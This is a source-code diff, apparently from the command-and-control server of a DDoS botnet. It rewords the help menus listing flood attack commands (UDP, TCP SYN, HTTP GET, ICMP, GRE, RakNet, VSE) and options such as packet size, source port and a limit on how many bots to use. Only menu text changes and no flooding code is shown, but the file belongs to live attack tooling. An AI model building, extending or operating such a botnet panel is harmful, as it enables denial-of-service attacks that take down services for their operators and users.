@@ -56,13 +56,13 @@ void handle_attack_list_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              CYAN "!vse - UDP Game VSE Query Flood\r\n"
              "!raknet - RakNet UnConnectedPing flood\r\n"
-             "!syn - TCP SYN+PSH Flood\r\n"
+             "!syn - TCP SYN Flood\r\n"
              "!socket - TCP Stream Connections Flood\r\n"
              "!http - HTTP 1.1 GET Flood\r\n"
              "!icmp - ICMP ECHO Flood\r\n"
              "!gre - GRE IP|TCP|UDP Specific Flood\r\n"
-             "!udp - Plain UDP Flood\r\n"
-             "!udpplain - Plain UDP Flood (FAST)\r\n" RESET);
+             "!udp - Generic UDP Flood\r\n"
+             "!udpplain - UDP Flood optimised for PPS\r\n" RESET);
 }
 
 /*
@@ -71,10 +71,10 @@ OPTHELP   C O M M A N D
 void handle_opthelp_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              RED "Optional Arguments:\r\n"
-             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 1450-UDPPLAIN | 8192-GRE)\r\n"
-             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
+             "psize - packet size (max: 64500-ICMP-UDP-SYN|1492-VSE-RakNet|1450-UDPPLAIN|8192-GRE)\r\n"
+             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535\r\n"
              "botcount - Limit bots to use\r\n"
-             "proto - GRE Proto (tcp/udp) default=none\r\n"
+             "proto - GRE Proto (tcp/udp) default=IP\r\n"
              "gport - destport for GRE\r\n"
             );
              }
